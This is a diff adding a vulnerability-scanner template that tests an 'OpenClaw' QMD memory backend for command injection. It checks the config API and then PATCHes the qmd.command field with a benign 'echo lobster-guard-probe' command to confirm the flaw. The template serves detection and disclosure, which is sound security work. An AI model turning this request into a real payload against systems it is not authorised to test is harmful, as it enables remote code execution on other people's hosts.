@@ -1,0 +1,47 @@
+id: openclaw-qmd-cmd-inject
+
+info:
+  name: OpenClaw QMD Memory Command Injection (VULN-32)
+  author: LobsterGuard
+  severity: critical
+  description: |
+    QMD memory backend config accepts arbitrary command strings via qmd.command
+    without sanitization. Config write access leads to RCE.
+    Source: memory/backend-config.ts:316-318
+  tags: openclaw,rce,injection,memory,v4
+
+http:
+  - raw:
+      - |
+        GET /api/config HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{token}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "qmd"
+          - "command"
+        condition: and
+        part: body
+
+  - raw:
+      - |
+        PATCH /api/config HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+
+        {"memory":{"backend":"qmd","backendConfig":{"qmd":{"command":"echo lobster-guard-probe"}}}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 204
